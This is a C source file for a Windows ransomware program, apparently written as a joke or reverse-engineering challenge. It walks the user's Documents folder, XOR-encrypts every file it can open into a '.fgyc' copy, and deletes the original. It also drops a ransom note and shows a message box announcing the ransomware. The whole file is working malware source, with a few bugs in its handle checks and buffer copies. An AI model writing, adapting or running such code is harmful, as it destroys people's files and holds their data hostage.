#define WIN32_LEAN_AND_MEAN
#include "key.h"
#include <shlobj.h>
#include <shlwapi.h>
#include <stdint.h>
#include <stdio.h>

static WINBOOL ends_with(const WCHAR *str, const WCHAR *suffix) {
	if (!str || !suffix)
		return 0;
	size_t lenstr = wcslen(str);
	size_t lensuffix = wcslen(suffix);
	if (lensuffix > lenstr)
		return 0;
	return wcsncmp(str + lenstr - lensuffix, suffix, lensuffix) == 0;
}

static void fuck_with_file(const WCHAR *path) {
	if (ends_with(path, L".fgyc"))
		return;
	if (ends_with(path, L".e.txt"))
		return;
	HANDLE read = CreateFileW(path, GENERIC_READ, 0, NULL, OPEN_EXISTING,
	                          FILE_ATTRIBUTE_NORMAL, 0);
	if (read == INVALID_HANDLE_VALUE)
		return;

	WCHAR fucked_path[MAX_PATH];
	swprintf(fucked_path, MAX_PATH, L"%ls.fgyc", path);

	HANDLE write = CreateFileW(fucked_path, GENERIC_WRITE, 0, NULL, CREATE_NEW,
	                           FILE_ATTRIBUTE_NORMAL, 0);
	if (read == INVALID_HANDLE_VALUE) {
		CloseHandle(read);
		return;
	}

	DWORD num_bytes = 0;
	DWORD num_bytes_witten = 0;
	uint64_t buf[1024];
	int success = 1;
	do {
		if (!ReadFile(read, buf, sizeof(buf), &num_bytes, NULL)) {
			success = 0;
			break;
		}
		for (size_t i = 0; i < 1024; ++i) {
			buf[i] ^= KEY;
		}
		if (!WriteFile(write, buf, num_bytes, &num_bytes_witten, NULL)) {
			success = 0;
			break;
		}
		if (num_bytes_witten != num_bytes) {
			success = 0;
			break;
		}
	} while (num_bytes > 0);

	CloseHandle(read);
	CloseHandle(write);

	if (success) {
		DeleteFileW(path);
	}
}

static WINBOOL walkdir(const WCHAR *starting_path) {
	WIN32_FIND_DATAW find_data;
	HANDLE find_handle = NULL;

	WCHAR curent_path[MAX_PATH];

	memcpy(curent_path, starting_path, MAX_PATH);
	PathAppendW(curent_path, L"*.*");

	if ((find_handle = FindFirstFileW(curent_path, &find_data)) ==
	    INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	do {
		if (wcscmp(find_data.cFileName, L".") != 0 &&
		    wcscmp(find_data.cFileName, L"..") != 0) {
			memcpy(curent_path, starting_path, MAX_PATH);
			PathAppendW(curent_path, find_data.cFileName);

			if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				walkdir(curent_path); // Recursion, I love it!
			} else {
				fuck_with_file(curent_path);
			}
		}
	} while (FindNextFileW(find_handle, &find_data));

	FindClose(find_handle);

	return TRUE;
}

int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline,
                     int cmdshow) {
	char *message =
		"All your files in your documents folder has been encrypted in the "
		"worst possible way!\n"
		"To get them back you can either reverse engineer this executable\n"
		"or you can go on the internet where somebody already did it.";

	WCHAR documents_path[MAX_PATH];
	WCHAR temp_path[MAX_PATH];

	if (FAILED(SHGetFolderPathW(NULL, CSIDL_PERSONAL, NULL, 0, documents_path)))
		return WM_QUIT;

	mempcpy(temp_path, documents_path, MAX_PATH);
	PathAppendW(temp_path, L"infected.e.txt");

	HANDLE handle = CreateFileW(temp_path, GENERIC_WRITE, 0, NULL,
	                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (GetLastError() != ERROR_FILE_EXISTS && handle != INVALID_HANDLE_VALUE) {
		WriteFile(handle, message, strlen(message), NULL, NULL);
	}
	CloseHandle(handle);

	walkdir(documents_path);

	MessageBoxA(NULL, message, "You've been hit by the worst ransomware",
	            MB_ICONEXCLAMATION);
	return WM_QUIT;
}
